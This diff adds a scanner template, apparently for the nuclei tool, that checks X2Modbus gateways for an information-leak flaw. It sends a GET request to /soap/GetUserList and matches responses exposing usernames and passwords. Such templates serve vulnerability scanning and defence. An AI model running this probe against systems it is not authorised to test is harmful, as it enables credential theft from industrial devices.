@@ -1,0 +1,27 @@
+id: poc-yaml-x2modbus-getuserlist-info-leak
+info:
+  name: 迅饶科技 X2Modbus网关 /GetUserList 敏感信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露, x2modbus
+http:
+  - method: GET
+    path:
+      - "/soap/GetUserList"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version"
+          - "<soap:Body>"
+          - "<PASSWORD>"
+          - "<USERNAME>"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+        condition: and
